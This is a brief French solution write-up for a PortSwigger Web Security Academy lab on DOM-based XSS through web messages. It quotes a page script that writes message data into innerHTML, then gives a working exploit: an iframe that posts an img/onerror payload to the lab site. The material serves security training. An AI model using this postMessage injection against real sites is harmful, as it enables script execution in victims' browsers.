# Lab

https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

## Solution

Dans les sources de la home page du site on voit cette fonction :

```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

En créant un exploit qui va envoyer un message à la page, on peut injecter du code dans la page.

```html
<iframe src="https://0aad00a50a409423f81ddc0eb00c9006f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')">
</iframe>
```